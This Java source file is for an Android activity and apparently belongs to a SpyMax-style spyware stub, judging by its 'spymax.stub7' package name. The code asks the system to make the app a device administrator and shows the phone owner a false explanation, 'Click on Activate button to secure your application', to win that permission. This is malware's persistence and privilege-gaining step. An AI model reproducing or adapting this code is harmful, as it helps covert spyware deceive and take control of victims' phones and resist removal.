package spymax.stub7;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;

public class activityadm extends Activity {
    private static final int REQUEST_CODE = 0;
    public static DevicePolicyManager mDPM;
    private ComponentName mAdminName;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            mDPM = (DevicePolicyManager)getSystemService(getApplicationContext().DEVICE_POLICY_SERVICE);
            // Set DeviceAdminDemo Receiver for active the component with different option
            mAdminName = new ComponentName(this, AdminReciver.class);
            if (!mDPM.isAdminActive(mAdminName)) {
                // try to become active
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
                ClassGen12.ClassGen12FOR_ADM=true;
                startActivityForResult(intent, REQUEST_CODE);
            }

        }catch (Exception ex){
        }

    }


}
